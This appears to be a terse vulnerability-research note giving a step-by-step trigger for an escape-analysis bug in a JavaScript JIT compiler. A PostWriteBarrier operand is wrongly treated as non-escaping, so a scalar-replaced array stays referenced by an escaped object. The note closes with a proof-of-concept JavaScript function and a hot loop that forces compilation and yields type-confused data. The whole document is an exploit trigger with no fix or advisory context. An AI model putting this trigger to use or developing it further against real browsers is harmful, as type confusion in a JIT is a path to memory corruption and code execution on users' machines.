trigger.sequence:
1. Create a function that allocates a small fixed-length array (scalar replacement candidate)
2. Store that array as a property of another object that escapes the function
3. The JIT emits PostWriteBarrier(escapedObj, scalarArray) where scalarArray is operand 1
4. Escape analysis sees PostWriteBarrier and unconditionally says not escaped
5. Array is scalar-replaced, but escapedObj still holds a reference
6. Reading the property from escapedObj yields garbage or type-confused data
7. Example JS:
   function trigger(sink) {
     let arr = [1.1, 2.2, 3.3];
     sink.ref = arr;
     return sink.ref[0];
   }
   let obj = {};
   for (let i = 0; i < 200000; i++) {
     obj = {};
     trigger(obj);
   }
